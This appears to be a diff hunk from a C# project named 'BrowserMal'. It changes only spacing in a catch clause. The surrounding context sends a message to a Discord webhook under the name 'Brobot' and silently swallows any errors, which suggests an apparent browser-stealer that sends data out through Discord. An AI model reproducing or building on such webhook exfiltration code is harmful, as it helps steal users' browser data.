@@ -92,7 +92,7 @@ namespace BrowserMal
                 DiscordMessageManager discordMessageManager = new DiscordMessageManager();
                 Webhook.Send(discordMessageManager.CreateMessage(color: 0xf50fd6, username: "Brobot"), discordWebhook);
             }
-            catch(Exception)
+            catch (Exception)
             {
             }
         }
